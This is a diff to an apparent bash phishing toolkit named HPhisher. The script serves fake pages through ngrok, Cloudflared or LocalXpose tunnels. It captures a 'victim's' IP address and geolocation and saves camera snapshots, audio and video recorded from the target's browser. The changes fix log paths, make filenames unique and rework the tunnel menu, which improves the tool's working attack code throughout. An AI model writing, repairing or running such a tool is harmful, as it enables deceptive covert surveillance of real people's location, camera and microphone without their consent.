@@ -30,7 +30,6 @@ sites_dir="${pro_dir}/.sites" #sites directory
 date=$(date +%d-%m-%Y)
 time=$(date +%H-%M-%S)
 logs_dir=$(date +%d-%m-%Y-%H-%M-%S)
-logs_full_dir="${files_dir}/${site_name}${logs_dir}"
 
 #Normal Banner
 banner(){
@@ -538,7 +537,8 @@ cusport() {
 ## Setup website and start php server
 setup_site() {
         echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-        cp -rf .sites/"$site_name"/"$site_template"/* .server/www
+	rm -rf .server/www/*
+        cp -rf .sites/$site_name/$site_template/* .server/www
 	if [ -e ".sites/ip.php" ]; then
 		cp .sites/ip.php .sites/"$website"/* .server/www
 	else
@@ -726,22 +726,19 @@ capture_data_check(){
 
 ## Get IP address
 capture_ip() {
-        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
-        IFS=$'\n'
-        echo -e "\n${RED} Victim's IP : ${RED}$IP"
-	echo -e " "
-	if [ reply_tunnel=1 ]; then
-		echo -ne "${RED} IP details cannot be captured in localhost server"
-		echo " "
-		rm -rf .server/www/ip.txt
-	elif [ reply_tunnel=01 ]; then
-		echo -ne "${RED} IP details cannot be captured in localhost server"
-		echo " "
-		rm -rf .server/www/ip.txt
-	else
-		ip_details
-		save_ip
-	fi
+##      IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+        IP=$(awk -F 'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+        echo "${MAGENTABG}${CYAN}"
+        echo -e " Victim's IP : $IP ${RESETBG}"
+        echo "${RESETBG}${NC}"
+        if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
+                echo -ne "${RED} IP details cannot be captured in localhost server"
+                echo " "
+                save_ip
+        else
+                ip_details $IP
+                save_ip
+        fi
 }
 save_ip() {
 	if [ -d ${files_dir}/${site_name}/${logs_dir} ]; then
@@ -818,8 +815,8 @@ ip_details() {
 		echo -e "${GREEN} State: ${NC} $region"
 	fi
 	cat track.txt >> "${log_name}.txt"
-##	rm -rf track.txt
-##	rm -rf rawtrack.txt
+	rm -rf track.txt
+	rm -rf rawtrack.txt
 }
 
 capture_data_image() {
@@ -831,7 +828,7 @@ capture_data_image() {
                 fi
                 sleep 0.75
             	if [[ -e ".server/www/Log.log" ]]; then
-			filename=$(date +%d-%m-%Y-%H-%M-%S)
+			filename=$(date +%d-%m-%Y-%H-%M-%S-%N)
 	               	echo " "
 		        printf "${GREEN} Cam file received! ${NC}"
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
@@ -843,7 +840,7 @@ capture_data_image() {
 				mkdir ${logs_dir}
 				mv ${logs_dir} ${files_dir}/${site_name}/
 				mv .server/www/*.png "image-${filename}.png"
-				mv "image-${filename}.png"  "${logs_full_dir}"
+				mv "image-${filename}.png"  "${logs_full_dir}/"
 			fi
                 fi
                 sleep 0.5
@@ -860,7 +857,7 @@ capture_data_audio() {
                 fi
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
-			filename=$(date +%d-%m-%Y-%H-%M-%S)
+			filename=$(date +%d-%m-%Y-%H-%M-%S-%N)
                         printf "${GREEN} Audio file received! ${NC}"
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
@@ -888,7 +885,7 @@ capture_data_video() {
                 fi
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
-			filename=$(date +%d-%m-%Y-%H-%M-%S)
+			filename=$(date +%d-%m-%Y-%H-%M-%S-%N)
                         printf "${GREEN} Video file received! ${NC}"
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
@@ -916,17 +913,17 @@ capture_data_video_audio() {
                 fi
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
-			filename=$(date +%d-%m-%Y-%H-%M-%S)
+			filename=$(date +%d-%m-%Y-%H-%M-%S-%N)
                         printf "${GREEN} Video and Audio file received! ${NC}"
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
                         rm -rf .server/www/Log.log
 			if [ -d ${logs_full_dir} ]; then
-                                mv .server/www/*.webm  "${logs_full_dir}/Video-${logs_dir}.webm"
+                                mv .server/www/*.webm  "${logs_full_dir}/vidaud-${logs_dir}.webm"
                         else
                                 mkdir ${logs_dir}
                                 mv ${logs_dir} ${files_dir}/${site_name}/
-                                mv .server/www/*.webm  "${logs_full_dir}/Video-${logs_dir}.webm"
+                                mv .server/www/*.webm  "${logs_full_dir}/vidaud-${logs_dir}.webm"
                         fi
                 fi
                 sleep 0.5
@@ -951,10 +948,9 @@ banner
 echo -e " "
 echo -e " "
 check_netstats
-echo "${GREEN}Network Status = ${RED}$netstats"
+echo "${GREEN}Network Status = ${BLUE}$netstats"
 echo -e " "
-echo -e "${RED} CHOOSE A SITE : ${NC}"
-echo -e " "
+echo -e "${BLUE} CHOOSE A SITE : ${NC}"
 echo -e " "
 echo -e "${BLUE} [1] ${GREEN} Image ${NC}"
 echo -e "${BLUE} [2] ${GREEN} Audio ${NC}"
@@ -970,10 +966,10 @@ echo -e " "
 read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher : ${BLUE}" reply_site
 echo " "
 case $reply_site in
-    1 | 01)
+	1 | 01)
 		site_name="image"
-	    site_image;;
-    2 | 02)
+		site_image;;
+	2 | 02)
 		site_name="audio"
 		site_audio;;
 	3 | 03)
@@ -1003,6 +999,7 @@ esac
 
 ## Tunnel selection
 tunnel_menu() {
+logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
 clear
 echo -e " "
 echo -e " "
@@ -1017,22 +1014,18 @@ echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detec
 echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
 echo -e " "
 read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} : ${BLUE}" reply_tunnel
-
-        case $reply_tunnel in
-            1 | 01)
-                start_localhost;;
-            2 | 02)
-				install_ngrok
-				start_ngrok;;
-            3 | 03)
-				install_cloudflared
-				start_cloudflared;;
-           	4 | 04)
-				install_loclx
-				start_loclx;;
-            *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; tunnel_menu; };;
+	case $reply_tunnel in
+        	1 | 01)
+                	start_localhost;;
+	        2 | 02)
+			check_ngrok;;
+		3 | 03)
+			check_cloudflared;;
+		4 | 04)
+			check_localxpose;;
+		*)
+                	echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+	                { sleep 1; tunnel_menu; };;
         esac
 }
 
